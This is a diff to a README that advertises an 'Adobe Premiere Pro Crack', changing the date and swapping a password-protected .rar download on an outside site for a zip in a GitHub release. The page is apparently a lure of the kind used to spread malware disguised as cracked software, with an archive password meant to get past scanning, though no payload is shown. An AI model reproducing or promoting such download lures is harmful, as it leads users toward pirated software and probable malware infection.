@@ -1,8 +1,8 @@
 #  🟢 Adobe Premiere Pro Crack 🟢
 ---
-> # 🔓 Password: GIT1HUB1FREE 🔓
-> # 📅 DATA: 04.03.2024 📅
+> # 
+> # 📅 DATA: 07.03.2024 📅
 > # 🟢 Status: WORK 🟢
 ---
 # Download
-### [Download the latest version](https://digitalxnetwork.com/INSTALLER%20PA$$WORD%20GIT1HUB1FREE.rar)
+### [Download the latest version](https://github.com/devsaket/Adobe-Premiere-Pro/releases/download/GH/GH.UPDATE07.03.2024.zip)
